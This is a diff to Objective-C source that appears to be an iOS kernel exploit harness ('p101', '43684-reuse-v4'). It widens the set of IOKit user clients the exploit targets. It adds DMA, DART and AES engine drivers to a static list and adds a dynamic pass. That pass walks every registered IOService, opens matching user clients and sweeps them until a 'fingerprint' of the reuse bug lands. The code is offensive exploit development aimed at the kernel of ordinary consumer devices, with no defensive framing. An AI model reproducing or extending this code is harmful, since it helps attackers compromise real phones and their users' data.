@@ -31,7 +31,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P101_BUILD @"p101-43684-reuse-v3"
+#define P101_BUILD @"p101-43684-reuse-v4"
 #define P101_TAG   @"p101"
 #define P101_LEN   0x4000ull
 
@@ -266,7 +266,12 @@ static int p101_is_fp(kern_return_t kr) {
 
     const char *svcs[] = {
         "IOSurfaceRoot", "IOMobileFramebuffer",
-        "AppleAVE2Driver", "AppleM2ScalerCSCDriver", "AppleT8020DART", "H11ANEIn", NULL
+        "AppleAVE2Driver", "AppleM2ScalerCSCDriver", "AppleT8020DART", "H11ANEIn",
+        /* v4: the 23F77 VA map puts every 43684 call site in the kernel's own
+           __TEXT_EXEC (generic IOKit/Mach) — the consumer is whichever UC
+           builds an IOMD and submits DMA. Sweep the DMA-engine UCs now. */
+        "AppleS8000AES", "ApplePIODMA", "AudioDMAController-T8101", "IODARTFamily",
+        "AppleT8101PCIe", "IOSlowAdaptiveClockingFamily", NULL
     };
     for (int i = 0; svcs[i] && !fired; i++) {
         io_iterator_t it = 0;
@@ -296,6 +301,45 @@ static int p101_is_fp(kern_return_t kr) {
             n++;
         }
         IOObjectRelease(it);
+    }
+
+    /* v4 DYNAMIC pass: walk every service instance, sweep UCs whose class
+       name carries a DMA/DART/AES engine family substring. This covers the
+       per-SoC names the static table can't (e.g. AudioDMAController-T8150 on
+       the 17 Pro Max). Bounded: 8 instances max across both open types. */
+    if (!fired) {
+        io_iterator_t it = 0;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
+                                                        IOServiceMatching("IOService"), &it);
+        if (kr == KERN_SUCCESS && it) {
+            L(@"[FIRE] dynamic registry pass (class name contains DMA/DART/AES)");
+            io_service_t svc;
+            unsigned opened = 0;
+            while ((svc = IOIteratorNext(it)) && opened < 8) {
+                char cls[128] = {0};
+                io_name_t c2;
+                if (IOObjectGetClass(svc, c2) == KERN_SUCCESS) {
+                    snprintf(cls, sizeof(cls), "%s", c2);
+                }
+                if (strstr(cls, "DMA") || strstr(cls, "DART") || strstr(cls, "AES") ||
+                    strstr(cls, "dma") || strstr(cls, "dart")) {
+                    for (uint32_t ty = 0; ty < 2 && !fired; ty++) {
+                        io_connect_t c = 0;
+                        kern_return_t okr = IOServiceOpen(svc, mach_task_self(), ty, &c);
+                        if (okr != KERN_SUCCESS || !c) continue;
+                        char who[96];
+                        snprintf(who, sizeof(who), "%s/t%u", cls, ty);
+                        sweep_conn(c, who);
+                        IOServiceClose(c);
+                        opened++;
+                    }
+                }
+                IOObjectRelease(svc);
+            }
+            L([NSString stringWithFormat:@"[*] dynamic pass: %u engine UCs swept%s",
+               opened, fired ? " (fingerprint landed)" : ""]);
+            IOObjectRelease(it);
+        }
     }
 
     if (mapped) mach_vm_deallocate(mach_task_self(), mapped, asz ? asz : P101_LEN);
